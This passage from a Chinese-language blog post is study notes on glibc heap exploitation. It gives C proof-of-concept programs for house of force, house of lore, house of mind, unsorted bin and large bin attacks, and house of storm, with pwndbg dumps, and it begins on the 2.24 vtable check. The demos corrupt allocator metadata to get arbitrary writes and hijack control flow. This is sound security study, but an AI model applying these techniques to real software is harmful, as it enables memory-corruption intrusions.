0x405790Size: 0x20871pwndbg&gt; x&#x2F;20gx 0x4052900x405290:0xffff8000004075800x00000000000005000x4052a0:0x00000000000000000x00000000000000000x4052b0:0x00000000000000000x00000000000000000x4052c0:0x00000000000000000x00000000000000000x4052d0:0x00000000000000000x00000000000000000x4052e0:0x00000000000000000x00000000000000000x4052f0:0x00000000000000000x00000000000000000x405300:0x00000000000000000x00000000000000000x405310:0x00000000000000000x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x7fffffffdd100x7fffffffdd10:0x00000000000001000xffff8000004075800x7fffffffdd20:0x00007fffffffdd100x00007fffffffdd100x7fffffffdd30:0x00007fffffffdd100x00007fffffffdd10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>释放掉之后<code>fake_chunk</code>会和第二个堆合并，再次申请即可得到<code>fake_chunk</code>的地址</p><h3 id="house-of-force-top-chunk"><a href="#house-of-force-top-chunk" class="headerlink" title="house_of_force(top chunk)"></a>house_of_force(top chunk)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;malloc.h&gt;#include &lt;assert.h&gt;char bss_var[] &#x3D; &quot;This is a string that we want to overwrite.&quot;;int main(int argc , char* argv[])&#123;intptr_t *p1 &#x3D; malloc(256);int real_size &#x3D; malloc_usable_size(p1);    intptr_t *ptr_top &#x3D; (intptr_t *) ((char *)p1 + real_size - sizeof(long));*(intptr_t *)((char *)ptr_top + sizeof(long)) &#x3D; -1;unsigned long evil_size &#x3D; (unsigned long)bss_var - sizeof(long)*4 - (unsigned long)ptr_top;void *new_ptr &#x3D; malloc(evil_size);void* ctr_chunk &#x3D; malloc(100);strcpy(ctr_chunk, &quot;YEAH!!!&quot;);assert(ctr_chunk &#x3D;&#x3D; bss_var);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同<code>2.23</code></p><h3 id="house-of-lore-small-bin"><a href="#house-of-lore-small-bin" class="headerlink" title="house_of_lore(small bin)"></a>house_of_lore(small bin)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;void jackpot()&#123; fprintf(stderr, &quot;Nice jump d00d\n&quot;); exit(0); &#125;int main(int argc, char * argv[])&#123;  intptr_t* stack_buffer_1[4] &#x3D; &#123;0&#125;;  intptr_t* stack_buffer_2[3] &#x3D; &#123;0&#125;;      void* fake_freelist[7][4];      intptr_t *victim &#x3D; malloc(0x100);  void *dummies[7];      for(int i&#x3D;0; i&lt;7; i++) dummies[i] &#x3D; malloc(0x100);  intptr_t *victim_chunk &#x3D; victim-2;  for(int i&#x3D;0; i&lt;6; i++) &#123;    fake_freelist[i][3] &#x3D; fake_freelist[i+1];  &#125;      fake_freelist[6][3] &#x3D; NULL;      stack_buffer_1[0] &#x3D; 0;  stack_buffer_1[1] &#x3D; 0;  stack_buffer_1[2] &#x3D; victim_chunk;  stack_buffer_1[3] &#x3D; (intptr_t*)stack_buffer_2;  stack_buffer_2[2] &#x3D; (intptr_t*)stack_buffer_1;  stack_buffer_2[3] &#x3D; (intptr_t *)fake_freelist[0];    void *p5 &#x3D; malloc(1000);  for(int i&#x3D;0; i&lt;7; i++) free(dummies[i]);  free((void*)victim);  void *p2 &#x3D; malloc(1200);  victim[1] &#x3D; (intptr_t)stack_buffer_1;   for(int i&#x3D;0; i&lt;7; i++) malloc(0x100);  void *p3 &#x3D; malloc(0x100);  char *p4 &#x3D; malloc(0x100);      intptr_t sc &#x3D; (intptr_t)jackpot;    long offset &#x3D; (long)__builtin_frame_address(0) - (long)p4;  memcpy((p4+offset+8), &amp;sc, 8);       assert((long)__builtin_return_address(0) &#x3D;&#x3D; (long)jackpot);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>和<code>2.23</code>差不多，就是多了一个从<code>small bin</code>链表进入<code>tcache</code>的操作</p><p>先填满<code>tcache</code>并创建一个<code>small bin</code>，再创建一个堆防止合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (smallbins) | PREV_INUSEAddr: 0x405250Size: 0x111fd: 0x7ffff7dcfda0bk: 0x7ffff7dcfda0Free chunk (tcache)Addr: 0x405360Size: 0x110fd: 0x00Free chunk (tcache) | PREV_INUSEAddr: 0x405470Size: 0x111fd: 0x405370Free chunk (tcache) | PREV_INUSEAddr: 0x405580Size: 0x111fd: 0x405480Free chunk (tcache) | PREV_INUSEAddr: 0x405690Size: 0x111fd: 0x405590Free chunk (tcache) | PREV_INUSEAddr: 0x4057a0Size: 0x111fd: 0x4056a0Free chunk (tcache) | PREV_INUSEAddr: 0x4058b0Size: 0x111fd: 0x4057b0Free chunk (tcache) | PREV_INUSEAddr: 0x4059c0Size: 0x111fd: 0x4058c0Allocated chunk | PREV_INUSEAddr: 0x405ad0Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x405ec0Size: 0x4c1Top chunk | PREV_INUSEAddr: 0x406380Size: 0x1fc81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x4059d0 —▸ 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0x110: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再在栈上创建一个伪造的<code>free list</code>，将<code>fake_freelist</code>伪造成每<code>0x20</code>就链接到下一个地址，最后<code>0x80</code>不做操作</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;10gx 0x7fffffffdd200x7fffffffdd20:0x00000000000000000x00000000000000000x7fffffffdd30:0x00000000004052500x00007fffffffdd000x7fffffffdd40:0x00007fffffffdda80x00000000000000f00x7fffffffdd50:0x00000000000000c20x000000000040190d0x7fffffffdd60:0x0000000000405ed00x0000000000405ae0pwndbg&gt; x&#x2F;10gx 0x7fffffffdd000x7fffffffdd00:0x00000000000000000x00000000000000000x7fffffffdd10:0x00007fffffffdd200x00007fffffffdc200x7fffffffdd20:0x00000000000000000x00000000000000000x7fffffffdd30:0x00000000004052500x00007fffffffdd000x7fffffffdd40:0x00007fffffffdda80x00000000000000f0...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>改<code>small bin</code>中的堆的<code>bk</code>为伪造的<code>free list</code>地址</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x4059d0 —▸ 0x4058c0 —▸ 0x4057b0 —▸ 0x4056a0 —▸ 0x405590 —▸ 0x405480 —▸ 0x405370 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0x110 [corrupted]FD: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;BK: 0x405250 —▸ 0x7fffffffdd20 —▸ 0x7fffffffdd00 —▸ 0x7fffffffdc20 —▸ 0x7fffffffdc40 ◂— ...largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>清空<code>tcache</code>再创建一个堆，使得伪造的堆逆向链入<code>tcache</code>，这样再次申请就可以在<code>tcache</code>中申请到栈地址了</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebins0x110 [  7]: 0x7fffffffdcb0 —▸ 0x7fffffffdc90 —▸ 0x7fffffffdc70 —▸ 0x7fffffffdc50 —▸ 0x7fffffffdc30 —▸ 0x7fffffffdd10 —▸ 0x7fffffffdd30 ◂— 0x0fastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x0smallbins0x110 [corrupted]FD: 0x405250 —▸ 0x7ffff7dcfda0 (main_arena+352) ◂— 0x405250 &#x2F;* &#39;PR@&#39; *&#x2F;BK: 0x7fffffffdcc0 —▸ 0x7fffffffdce0 ◂— 0x0largebinsempty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Free chunk (smallbins) | PREV_INUSEAddr: 0x405250Size: 0x111fd: 0x7ffff7dcfda0bk: 0x7fffffffdd20Allocated chunk | PREV_INUSEAddr: 0x405360Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405470Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405580Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405690Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4057a0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4058b0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x4059c0Size: 0x111Allocated chunk | PREV_INUSEAddr: 0x405ad0Size: 0x3f1Allocated chunk | PREV_INUSEAddr: 0x405ec0Size: 0x4c1Top chunk | PREV_INUSEAddr: 0x406380Size: 0x1fc81<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="house-of-mind-fastbin-arena"><a href="#house-of-mind-fastbin-arena" class="headerlink" title="house_of_mind_fastbin(arena)"></a>house_of_mind_fastbin(arena)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;stdint.h&gt;#include &lt;assert.h&gt;int main()&#123;int HEAP_MAX_SIZE &#x3D; 0x4000000;int MAX_SIZE &#x3D; (128*1024) - 0x100;    uint8_t* fake_arena &#x3D; malloc(0x1000); uint8_t* target_loc &#x3D; fake_arena + 0x30;uint8_t* target_chunk &#x3D; (uint8_t*) fake_arena - 0x10;fake_arena[0x888] &#x3D; 0xFF;fake_arena[0x889] &#x3D; 0xFF; fake_arena[0x88a] &#x3D; 0xFF; uint64_t new_arena_value &#x3D; (((uint64_t) target_chunk) + HEAP_MAX_SIZE) &amp; ~(HEAP_MAX_SIZE - 1);uint64_t* fake_heap_info &#x3D; (uint64_t*) new_arena_value;uint64_t* user_mem &#x3D; malloc(MAX_SIZE);    while((long long)user_mem &lt; new_arena_value)&#123;user_mem &#x3D; malloc(MAX_SIZE);&#125;uint64_t* fastbin_chunk &#x3D; malloc(0x50); uint64_t* chunk_ptr &#x3D; fastbin_chunk - 2;     uint64_t* tcache_chunks[7];for(int i &#x3D; 0; i &lt; 7; i++)&#123;tcache_chunks[i] &#x3D; malloc(0x50);&#125;for(int i &#x3D; 0; i &lt; 7; i++)&#123;free(tcache_chunks[i]);&#125;fake_heap_info[0] &#x3D; (uint64_t) fake_arena;     chunk_ptr[1] &#x3D; 0x60 | 0x4;     free(fastbin_chunk);     assert(*((unsigned long *) (target_loc)) !&#x3D; 0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>通过伪造<code>arena</code>的<code>HEAP_MAX_SIZE、MAX_SIZE、system_mem</code>并申请到<code>fast bin</code>再释放来将一个<code>chunk</code>的内容为一个很大的值</p><p>其中需要绕过一个检查，即申请的内存不能大于<code>system_men</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">if (__builtin_expect (chunksize_nomask (victim) &lt;&#x3D; 2 * SIZE_SZ, 0)              || __builtin_expect (chunksize_nomask (victim)   &gt; av-&gt;system_mem, 0))            malloc_printerr (&quot;malloc(): memory corruption&quot;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>创建一个<code>0x1000</code>的堆用于伪造<code>arena</code>，由于没有刷新缓冲流所以有一个多出来的堆</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x411Allocated chunk | PREV_INUSEAddr: 0x405660Size: 0x1011Top chunk | PREV_INUSEAddr: 0x406670Size: 0x1f991<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在<code>0x888</code>的位置设置<code>system_men</code>大小为<code>0xFFFFFFFF</code></p><pre class="line-numbers language-none"><code class="language-none">0x405ef0:0x00000000000000000x0000000000ffffff<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>以<code>MAX_SIZE</code>的大小创建堆直至满足<code>user_mem &lt; new_arena_value</code>的最多数量，由于<code>mmap_threshold=0x20000</code>所以创建的堆大小为<code>0x1ff00</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x411Allocated chunk | PREV_INUSEAddr: 0x405660Size: 0x1011Allocated chunk | PREV_INUSEAddr: 0x406670Size: 0x1ff11Allocated chunk | PREV_INUSEAddr: 0x426580Size: 0x1ff11Allocated chunk | PREV_INUSEAddr: 0x446490Size: 0x1ff11Allocated chunk | PREV_INUSEAddr: 0x4663a0Size: 0x1ff11...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>填满<code>tcache</code>创建一个<code>fast bin</code>，将<code>fake_heap_info</code>的<code>ar_ptr</code>给设置成<code>fake_arena</code>并设置<code>fast bin</code>的<code>non_main_arena</code>标志位，再全部释放之后即可根据<code>heap_info</code>的<code>ar_ptr</code>找到我们的假chunk并更改chunk的内容达到目的</p><h3 id="unsorted-bin-attack-1"><a href="#unsorted-bin-attack-1" class="headerlink" title="unsorted_bin_attack"></a>unsorted_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;assert.h&gt;int main()&#123;volatile unsigned long stack_var&#x3D;0;unsigned long *p&#x3D;malloc(0x410);malloc(500);free(p);    p[1]&#x3D;(unsigned long)(&amp;stack_var-2);    malloc(0x410);    assert(stack_var !&#x3D; 0);&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同<code>2.23</code>，大小大于<code>tcache</code></p><h3 id="large-bin-attack-1"><a href="#large-bin-attack-1" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;#include&lt;assert.h&gt; int main()&#123;    setbuf(stdout, NULL);    unsigned long stack_var1 &#x3D; 0;    unsigned long stack_var2 &#x3D; 0;    unsigned long *p1 &#x3D; malloc(0x420);    malloc(0x20);    unsigned long *p2 &#x3D; malloc(0x500);    malloc(0x20);    unsigned long *p3 &#x3D; malloc(0x500);    malloc(0x20);     free(p1);    free(p2);    malloc(0x90);    free(p3);    p2[-1] &#x3D; 0x3f1;    p2[0] &#x3D; 0;    p2[2] &#x3D; 0;    p2[1] &#x3D; (unsigned long)(&amp;stack_var1 - 2);    p2[3] &#x3D; (unsigned long)(&amp;stack_var2 - 4);    malloc(0x90);     assert(stack_var1 !&#x3D; 0);    assert(stack_var2 !&#x3D; 0);    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用进入<code>large bin</code>插入的堆大小大于上一个堆的大小时会将上一个堆的<code>bk</code>和<code>bk_nextsize</code>的堆中写入当前堆的地址来实现改栈上地址为堆地址</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">while ((unsigned long) size &lt; chunksize_nomask (fwd))                       &#123;                         fwd &#x3D; fwd-&gt;fd_nextsize;  assert (chunk_main_arena (fwd));                       &#125;                     if ((unsigned long) size  &#x3D;&#x3D; (unsigned long) chunksize_nomask (fwd))                       &#x2F;* Always insert in the second position.  *&#x2F;                       fwd &#x3D; fwd-&gt;fd;                     else                       &#123;                         victim-&gt;fd_nextsize &#x3D; fwd;                         victim-&gt;bk_nextsize &#x3D; fwd-&gt;bk_nextsize;                         fwd-&gt;bk_nextsize &#x3D; victim;                         victim-&gt;bk_nextsize-&gt;fd_nextsize &#x3D; victim;                       &#125;bck &#x3D; fwd-&gt;bk;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>先创建一个属于<code>small bin</code>的堆和两个属于<code>large bin</code>的堆，每个堆创建之后都要创建一个堆防止合并</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heapAllocated chunk | PREV_INUSEAddr: 0x405000Size: 0x251Allocated chunk | PREV_INUSEAddr: 0x405250Size: 0x431Allocated chunk | PREV_INUSEAddr: 0x405680Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x4056b0Size: 0x511Allocated chunk | PREV_INUSEAddr: 0x405bc0Size: 0x31Allocated chunk | PREV_INUSEAddr: 0x405bf0Size: 0x511Allocated chunk | PREV_INUSEAddr: 0x406100Size: 0x31Top chunk | PREV_INUSEAddr: 0x406130Size: 0x1fed1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放两个堆，再创建一个小于第一个堆大小的堆，使得第一个堆还在<code>unsorted bin</code>但第二个堆进入<code>large bin</code></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebinsemptyfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x4052f0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x4052f0smallbinsemptylargebins0x500: 0x4056b0 —▸ 0x7ffff7dd00d0 (main_arena+1168) ◂— 0x4056b0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>释放第三个堆进入<code>unsorted bin</code>，改第二个堆大小小于第三个堆并改<code>bk</code>和<code>bk_nextsize</code>为<code>stack_var1 - 0x10</code>，<code>stack_var2 - 0x20</code>,此时&#96;&#96;P2 -&gt; bk -&gt; fd &#x3D; stack_var1_addr  P2 -&gt; bk_nextsize -&gt; fd_nextsize &#x3D; stack_var2_addr&#96;</p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bintcachebinsemptyfastbins0x20: 0x00x30: 0x00x40: 0x00x50: 0x00x60: 0x00x70: 0x00x80: 0x0unsortedbinall: 0x405bf0 —▸ 0x4052f0 —▸ 0x7ffff7dcfca0 (main_arena+96) ◂— 0x405bf0smallbinsemptylargebins0x500 [corrupted]FD: 0x4056b0 ◂— 0x0BK: 0x4056b0 —▸ 0x7fffffffdd60 —▸ 0x405c00 ◂— 0x0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x4056b00x4056b0:0x00000000000000000x00000000000003f10x4056c0:0x00000000000000000x00007fffffffdd600x4056d0:0x00000000000000000x00007fffffffdd48<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>再次创建一个小的堆时第三个堆会进入<code>large bin</code>，此时会进行上面分析的操作使得第二个堆的<code>bk</code>和<code>bk_nextsize</code>中的栈地址的内容变成第三个堆地址</p><h3 id="house-of-storm-largebin-unsortedbin"><a href="#house-of-storm-largebin-unsortedbin" class="headerlink" title="house_of_storm(largebin + unsortedbin)"></a>house_of_storm(largebin + unsortedbin)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char filler[0x60];char target[0x60]; void init()&#123;        setvbuf(stdout, NULL, _IONBF, 0);        setvbuf(stdin, NULL, _IONBF, 0);&#125;int get_shift_amount(char* pointer)&#123;int shift_amount &#x3D; 0;long long ptr &#x3D; (long long)pointer;while(ptr &gt; 0x20)&#123;ptr &#x3D; ptr &gt;&gt; 8; shift_amount +&#x3D; 1; &#125;return shift_amount - 1; &#125;int main()&#123;init();    char *unsorted_bin, *large_bin, *fake_chunk, *ptr;int* tcaches[7];unsorted_bin &#x3D; malloc ( 0x4e8 );      malloc ( 0x18 ); int shift_amount &#x3D; get_shift_amount(unsorted_bin);    size_t alloc_size &#x3D; ((size_t)unsorted_bin) &gt;&gt; (8 * shift_amount);if(alloc_size &lt; 0x10)&#123;printf(&quot;Chunk Size: 0x%lx\n&quot;, alloc_size);puts(&quot;Chunk size is too small&quot;);exit(1);&#125;alloc_size &#x3D; (alloc_size &amp; 0xFFFFFFFFE) - 0x10;     if((alloc_size &amp; 0x8) !&#x3D; 0 || (((alloc_size &amp; 0x4) &#x3D;&#x3D; 0x4) &amp;&amp; ((alloc_size &amp; 0x2) !&#x3D; 0x2)))&#123;    return 1;    &#125;if(alloc_size &lt; 0x410)&#123;for(int i &#x3D; 0; i &lt; 7; i++)&#123;tcaches[i] &#x3D; malloc(alloc_size);&#125;for(int i &#x3D; 0; i &lt; 7; i++)&#123;free(tcaches[i]);&#125;&#125;else&#123;puts(&quot;Not filling up the TCache&quot;);&#125;large_bin  &#x3D;  malloc ( 0x4d8 ); malloc ( 0x18 );free ( large_bin ); free ( unsorted_bin );unsorted_bin &#x3D; malloc(0x4e8);free(unsorted_bin);fake_chunk &#x3D; target - 0x10;((size_t *)unsorted_bin)[1] &#x3D; (size_t)fake_chunk; (( size_t *) large_bin )[1]  &#x3D;  (size_t)fake_chunk  +  8 ; (( size_t *) large_bin)[3] &#x3D; (size_t)fake_chunk - 0x18 - shift_amount; ptr &#x3D; calloc(alloc_size, 1);strncpy(ptr, &quot;\x41\x42\x43\x44\x45\x46\x47&quot;, 0x58 - 1);printf(&quot;String after %s\n&quot;, target);printf(&quot;Fake chunk ptr: %p\n&quot;, ptr);return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原理同<code>2.23</code>，<code>large bin</code>的应用同<code>2.27 large bin attack</code>，在<code>large bin attack</code>基础上利用<code>unsorted bin</code>实现任意地址分配</p><h2 id="glibc-2-24"><a href="#glibc-2-24" class="headerlink" title="glibc_2.24"></a>glibc_2.24</h2><p><code>2.24-2.28</code>最主要的区别就是加了<code>vtable</code>的检测，所以不能改<code>vtable</code>为堆地址</p><h3 id="house-of-orange-检测机制与绕过"><a href="#house-of-orange-检测机制与绕过" class="headerlink" title="house_of_orange-检测机制与绕过"></a>house_of_orange-检测机制与绕过</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">void _IO_vtable_check (void) attribute_hidden;&#x2F;* Perform vtable pointer validation.  If validation fails, terminate   the process.  *&#x2F;static inline const struct _IO_jump_t *IO_validate_vtable (const struct _IO_jump_t *vtable)&#123;  &#x2F;* Fast path: The vtable pointer is within the __libc_IO_vtables     section.  *&#x2F;  uintptr_t section_length &#x3D; __stop___libc_IO_vtables - __start___libc_IO_vtables;  const char *ptr &#x3D; (const char *) vtable;  uintptr_t offset &#x3D; ptr - __start___libc_IO_vtables;  if (__glibc_unlikely (offset &gt;&#x3D; section_length))    &#x2F;* The vtable pointer is not in the expected section.  Use the       slow path, which will terminate the process if necessary.  *&#x2F;    _IO_vtable_check ();  return vtable;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>即<code>vtable - start_libc_IO_vtables  &gt;= stop_libc_IO_vtables - start_libc_IO_vtables</code>时调用<code>_IO_vtable_check</code></p><pre class="line-numbers language-C" data-language="C"><code class="language-C">pwndbg&gt; p __stop___libc_IO_vtables - 1$7 &#x3D; 0x7ffff7dcf627 &lt;_IO_str_chk_jumps+167&gt; &quot;&quot;pwndbg&gt; p __start___libc_IO_vtables$8 &#x3D; 0x7ffff7dce8c0 &lt;_IO_helper_jumps&gt; &quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><code>_IO_vtable_check</code>函数具体内容如下</p><pre class="line-numbers language-C" data-language="C"><code class="language-C">void attribute_hidden_IO_vtable_check (void)&#123;#ifdef SHARED  &#x2F;* Honor the compatibility flag.  *&#x2F;  void (*flag) (void) &#x3D; atomic_load_relaxed (&amp;IO_accept_foreign_vtables);#ifdef PTR_DEMANGLE  PTR_DEMANGLE (flag);#endif  if (flag &#x3D;&#x3D; &amp;_IO_vtable_check)    return;  &#x2F;* In case this libc copy is in a non-default namespace, we always     need to accept foreign vtables because there is always a     possibility that FILE * objects are passed across the linking     boundary.  *&#x2F;  &#123;    Dl_info di;    struct link_map *l;    if (_dl_open_hook !&#x3D; NULL        || (_dl_addr (_IO_vtable_check, &amp;di, &amp;l, NULL) !&#x3D; 0            &amp;&amp; 